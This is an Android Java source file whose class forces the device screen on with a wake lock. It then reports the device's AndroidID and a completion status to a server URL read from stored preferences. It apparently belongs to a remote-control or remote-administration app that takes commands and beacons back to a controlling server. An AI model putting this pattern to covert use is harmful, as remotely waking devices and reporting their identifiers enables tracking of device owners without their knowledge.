package u.can.i.up.expert.utils;

import android.content.Context;
import android.os.AsyncTask;
import android.os.PowerManager;
import android.preference.PreferenceManager;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class screenOn extends AsyncTask<String, Void, String> {
    @Override
    protected String doInBackground(String... params) {
        PowerManager pm = (PowerManager) DataSet.getInstance().myService.getSystemService(Context.POWER_SERVICE);
        final PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK |PowerManager.ACQUIRE_CAUSES_WAKEUP |PowerManager.ON_AFTER_RELEASE, "");
        wl.acquire();
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {try {
        Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Screen On Complete");
    } catch (UnsupportedEncodingException e) {

        e.printStackTrace();
    }}
    @Override
    protected void onPreExecute() {}
    @Override
    protected void onProgressUpdate(Void... values) {}
}
